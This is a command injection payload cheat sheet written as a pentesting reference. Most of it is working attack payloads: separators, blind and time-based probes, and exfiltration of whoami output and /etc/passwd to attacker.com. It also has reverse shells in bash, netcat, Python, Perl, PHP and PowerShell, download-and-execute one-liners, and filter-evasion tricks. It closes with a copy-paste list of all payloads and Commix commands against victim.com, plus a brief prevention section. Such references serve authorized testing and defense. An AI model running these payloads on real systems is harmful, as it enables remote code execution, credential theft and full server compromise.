# COMMAND INJECTION PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS COMMAND INJECTION?

**OS Command Injection** occurs when an application passes unsafe user-supplied data to a system shell. The attacker can execute arbitrary operating system commands on the server, leading to:

- **RCE (Remote Code Execution)**
- **Data theft** (files, credentials, environment variables)
- **Reverse shell** establishment
- **Pivoting** into internal networks
- **Full server compromise**

**Key fact:** It is in the **OWASP Top 10** (A03:2021 – Injection).

---

## 2. TYPES OF COMMAND INJECTION

| Type | Description |
|------|-------------|
| **In-Band (Classic)** | The command output is visible in the HTTP response. |
| **Blind (Time-Based)** | No output; the attacker infers execution by response delays. |
| **Blind (Out-of-Band / OOB)** | The command triggers a DNS or HTTP request to an attacker-controlled server. |
| **Blind (Boolean)** | The attacker observes different behavior (true/false) based on conditions. |

---

## 3. COMMAND SEPARATORS AND METACHARACTERS

These characters break out of the original command and allow the injection of a new one.

| Separator | OS | Description |
|-----------|----|-------------|
| `;` | Linux / macOS | Run next command regardless of result |
| `\|` | Linux / Windows | Pipe output |
| `\|\|` | Linux / Windows | Run next command only if first fails |
| `&` | Linux / Windows | Run next command in background |
| `&&` | Linux / Windows | Run next command only if first succeeds |
| `` ` `` | Linux | Command substitution |
| `$()` | Linux | Command substitution |
| `%0a` | Both | Newline (URL-encoded) |
| `%0d%0a` | Both | CRLF (URL-encoded) |
| `\n` | Both | Newline (raw) |

---

## 4. BASIC DETECTION PAYLOADS

### 4.1 Linux / Unix

```
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0a whoami
%0d%0a whoami
; id
| id
$(id)
`id`
; uname -a
; hostname
; pwd
; ls -la
; cat /etc/passwd
```

### 4.2 Windows

```
; whoami
| whoami
|| whoami
& whoami
&& whoami
%0a whoami
%0d%0a whoami
; ipconfig
| ipconfig
& ipconfig
; dir
| dir
& dir
; type C:\Windows\win.ini
; systeminfo
; ver
```

### 4.3 Combined (works on both)

```
; whoami
| whoami
|| whoami
& whoami
&& whoami
%0a whoami
%0d%0a whoami
```

---

## 5. TIME-BASED (BLIND) DETECTION PAYLOADS

Use a delay of 5 seconds to detect blind command injection.

### Linux
```
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)
%0a sleep 5
%0d%0a sleep 5
; ping -c 5 127.0.0.1
```

### Windows
```
; timeout 5
| timeout 5
& timeout 5
&& timeout 5
; ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1
& ping -n 5 127.0.0.1
```

### macOS
```
; sleep 5
| sleep 5
& sleep 5
$(sleep 5)
```

---

## 6. OUT-OF-BAND (OOB) PAYLOADS

Use **Burp Collaborator** or **Interactsh** to detect outbound requests.

### DNS Exfiltration
```
; nslookup attacker.burpcollaborator.net
| nslookup attacker.burpcollaborator.net
& nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
; dig attacker.burpcollaborator.net
; host attacker.burpcollaborator.net
```

### HTTP Exfiltration
```
; curl http://attacker.com/
| curl http://attacker.com/
& curl http://attacker.com/
$(curl http://attacker.com/)
; wget http://attacker.com/
; powershell -c "Invoke-WebRequest http://attacker.com/"
```

### Exfiltration with Data
```
; curl http://attacker.com/$(whoami)
; curl http://attacker.com/?x=$(cat /etc/passwd | base64 -w0)
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
```

### Windows OOB
```
; certutil -urlcache -f http://attacker.com/payload.exe payload.exe
; powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
; nslookup attacker.burpcollaborator.net
```

---

## 7. READING FILES

### Linux
```
; cat /etc/passwd
; cat /etc/hosts
; cat /etc/shadow
; cat /proc/self/environ
; cat /proc/self/cmdline
; ls -la /var/www/html/
; find / -name "*.conf" 2>/dev/null
; base64 /etc/passwd
```

### Windows
```
; type C:\Windows\win.ini
; type C:\Windows\System32\drivers\etc\hosts
; type C:\Users\Administrator\Desktop\flag.txt
; dir C:\
; dir C:\Users\
; powershell -c "Get-Content C:\Windows\win.ini"
```

### Exfiltrate File Contents
```
; curl http://attacker.com/ -d @/etc/passwd
; curl http://attacker.com/ --data-binary @/etc/passwd
; curl -X POST http://attacker.com/ -d "$(cat /etc/passwd)"
; nslookup $(cat /etc/passwd | base64 -w0).attacker.com
```

---

## 8. REVERSE SHELL PAYLOADS

### Bash
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### Netcat
```
; nc -e /bin/bash attacker.com 4444
; nc attacker.com 4444 -e /bin/sh
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

### Python
```
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl
```
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell (Windows)
```
; powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
; powershell -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Encoded Reverse Shell (Base64)
```
; echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64
; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYxCg==' | base64 -d | bash
```

---

## 9. BYPASS TECHNIQUES

### 9.1 Space Bypass
When spaces are filtered, use these alternatives:

```
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
cat%0a/etc/passwd
```

### 9.2 Separator Bypass
When common separators are filtered:

```
%0a whoami
%0d%0a whoami
%09 whoami
${IFS}whoami
$IFS$9whoami
```

### 9.3 Blacklist Bypass (Character Obfuscation)

**Using quotes:**
```
w"h"o"a"m"i
w'h'o'a'm'i
c\at /etc/passwd
```

**Using variables:**
```
a=who;b=ami;$a$b
a=cat;b=/etc/passwd;$a $b
```

**Using wildcards:**
```
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
/???/??t /etc/passwd
```

**Using concatenation:**
```
who$(echo)ami
who`echo`ami
c'a't /etc/passwd
```

### 9.4 Encoding Bypass
```
%3B whoami       # URL-encoded ;
%7C whoami       # URL-encoded |
%26 whoami       # URL-encoded &
%60 whoami       # URL-encoded backtick
%24%28whoami%29  # URL-encoded $(whoami)
```

### 9.5 Command Obfuscation with Base64
```
; echo d2hvYW1p | base64 -d | bash
; echo d2hvYW1p | base64 -d | sh
; `echo d2hvYW1p | base64 -d`
```

### 9.6 Newline / Tab Injection
```
%0a whoami
%0d%0a whoami
%09 whoami
%0b whoami
%0c whoami
```

### 9.7 Using `$IFS` (Internal Field Separator)
```
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
```

### 9.8 Using Bash Brace Expansion
```
{cat,/etc/passwd}
{,cat,/etc/passwd}
```

### 9.9 Windows Bypass

**Using `^` (caret):**
```
w^h^o^a^m^i
c^a^t C:\Windows\win.ini
```

**Using quotes:**
```
w"h"o"a"m"i
"whoami"
```

**Using variables:**
```
set a=who&& set b=ami&& call %a%%b%
```

**Using `%COMSPEC%`:**
```
%COMSPEC% /c whoami
```

**Using PowerShell encoded command:**
```
powershell -EncodedCommand dwBoAG8AYQBtAGkA
```

---

## 10. FILTER EVASION CHEAT SHEET

| Filter | Bypass |
|--------|--------|
| Space | `$IFS`, `%09`, `%0a`, `${IFS}`, `{cmd,arg}` |
| `;` | `%0a`, `%0d%0a`, `\|`, `&&`, `&` |
| `\|` | `%0a`, `;`, `&&`, `&` |
| `&` | `%0a`, `;`, `\|`, `&&` |
| `whoami` | `who$IFS$9ami`, `w'h'o'a'm'i`, `/???/???mi` |
| `cat` | `/bin/c?t`, `/bin/ca*`, `c\at` |
| `/etc/passwd` | `/etc/pas?wd`, `/etc/pass*`, `cat</etc/passwd` |
| `curl` | `cu\rl`, `c'u'rl`, `$(which curl)` |
| `bash` | `b\ash`, `b'a'sh`, `/bin/b?sh` |
| `(` | `%28` (URL-encode) |
| `$` | `%24` (URL-encode) |

---

## 11. TOOLS

| Tool | Usage |
|------|-------|
| **Commix** | Automatic command injection exploitation. |
| **Burp Suite** | Manual testing with Intruder and Repeater. |
| **Interactsh** | Blind OOB detection via DNS/HTTP. |
| **Burp Collaborator** | Blind OOB detection. |
| **PayloadsAllTheThings** | Repository of command injection payloads. |
| **HackTricks** | Complete command injection guide. |

### Commix Commands
```bash
commix -u "http://victim.com/?param=INJECT"
commix -u "http://victim.com/?param=INJECT" --os-cmd=whoami
commix -u "http://victim.com/?param=INJECT" --reverse-tcp attacker.com:4444
commix --url="http://victim.com/" --data="param=INJECT"
```

### Test with curl
```bash
curl "http://victim.com/?param=;whoami"
curl "http://victim.com/?param=|whoami"
curl "http://victim.com/?param=\$(whoami)"
```

---

## 12. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Avoid system calls** | Use language-native libraries instead of shell commands. |
| **2. Use parameterized APIs** | In Python, use `subprocess.run([...])` with a list, not `shell=True`. |
| **3. Input validation** | Whitelist allowed characters (a-z, A-Z, 0-9). |
| **4. Escape input** | Use `shlex.quote()` in Python, `escapeshellarg()` in PHP. |
| **5. Use allowlists** | Only allow specific commands, not arbitrary input. |
| **6. Principle of least privilege** | Run the app with minimal OS permissions. |
| **7. Sandboxing** | Use containers, seccomp, AppArmor, or SELinux. |
| **8. Disable dangerous functions** | In PHP: `disable_functions = system,exec,shell_exec,passthru,popen,proc_open`. |
| **9. Log and monitor** | Detect suspicious command patterns. |
| **10. WAF and RASP** | Use WAF rules specific to command injection. |

---

## 13. TIPS FOR TESTING

1. Identify any parameter that might be passed to a shell (ping, DNS lookups, file operations).
2. Start with simple separators: `;`, `|`, `&&`, `&`.
3. If output is not visible, use time-based payloads (`sleep 5`).
4. If time-based works, try OOB with Burp Collaborator or Interactsh.
5. If filters block spaces, use `$IFS`, `%09`, or `${IFS}`.
6. If common commands are blocked, use wildcards, quotes, or base64.
7. Test both Linux and Windows payloads if the OS is unknown.
8. Use `--status-timer` in Burp to measure delays precisely.
9. Always test on your own environment first.
10. Use Commix for automated exploitation.

---

## 14. QUICK REFERENCE – SEPARATORS

| Character | URL Encoding | Linux | Windows |
|-----------|--------------|-------|---------|
| `;` | `%3B` | Yes | Yes |
| `\|` | `%7C` | Yes | Yes |
| `\|\|` | `%7C%7C` | Yes | Yes |
| `&` | `%26` | Yes | Yes |
| `&&` | `%26%26` | Yes | Yes |
| `` ` `` | `%60` | Yes | No |
| `$()` | `%24%28%29` | Yes | No |
| `\n` | `%0A` | Yes | Yes |
| `\r\n` | `%0D%0A` | Yes | Yes |
| `\t` | `%09` | Yes | Yes |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0a whoami
%0d%0a whoami
; id
| id
$(id)
`id`
; uname -a
; hostname
; pwd
; ls -la
; cat /etc/passwd
; cat /etc/hosts
; cat /etc/shadow
; cat /proc/self/environ
; cat /proc/self/cmdline
; ipconfig
| ipconfig
& ipconfig
; dir
| dir
& dir
; type C:\Windows\win.ini
; type C:\Windows\System32\drivers\etc\hosts
; systeminfo
; ver
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
; timeout 5
| timeout 5
& timeout 5
; ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1
& ping -n 5 127.0.0.1
; nslookup attacker.burpcollaborator.net
| nslookup attacker.burpcollaborator.net
& nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
; dig attacker.burpcollaborator.net
; host attacker.burpcollaborator.net
; curl http://attacker.com/
| curl http://attacker.com/
& curl http://attacker.com/
$(curl http://attacker.com/)
; wget http://attacker.com/
; powershell -c "Invoke-WebRequest http://attacker.com/"
; curl http://attacker.com/$(whoami)
; curl http://attacker.com/?x=$(cat /etc/passwd | base64 -w0)
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; certutil -urlcache -f http://attacker.com/payload.exe payload.exe
; powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
; base64 /etc/passwd
; curl http://attacker.com/ -d @/etc/passwd
; curl http://attacker.com/ --data-binary @/etc/passwd
; curl -X POST http://attacker.com/ -d "$(cat /etc/passwd)"
; nslookup $(cat /etc/passwd | base64 -w0).attacker.com
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc -e /bin/bash attacker.com 4444
; nc attacker.com 4444 -e /bin/sh
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
; powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
; echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64
; echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYxCg==' | base64 -d | bash
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
cat%0a/etc/passwd
%0a whoami
%0d%0a whoami
%09 whoami
${IFS}whoami
$IFS$9whoami
w"h"o"a"m"i
w'h'o'a'm'i
c\at /etc/passwd
a=who;b=ami;$a$b
a=cat;b=/etc/passwd;$a $b
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
/???/??t /etc/passwd
who$(echo)ami
who`echo`ami
c'a't /etc/passwd
%3B whoami
%7C whoami
%26 whoami
%60 whoami
%24%28whoami%29
; echo d2hvYW1p | base64 -d | bash
; echo d2hvYW1p | base64 -d | sh
; `echo d2hvYW1p | base64 -d`
%0b whoami
%0c whoami
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
{,cat,/etc/passwd}
w^h^o^a^m^i
c^a^t C:\Windows\win.ini
w"h"o"a"m"i
set a=who&& set b=ami&& call %a%%b%
%COMSPEC% /c whoami
powershell -EncodedCommand dwBoAG8AYQBtAGkA
commix -u "http://victim.com/?param=INJECT"
commix -u "http://victim.com/?param=INJECT" --os-cmd=whoami
commix -u "http://victim.com/?param=INJECT" --reverse-tcp attacker.com:4444
commix --url="http://victim.com/" --data="param=INJECT"
curl "http://victim.com/?param=;whoami"
curl "http://victim.com/?param=|whoami"
curl "http://victim.com/?param=\$(whoami)"
```
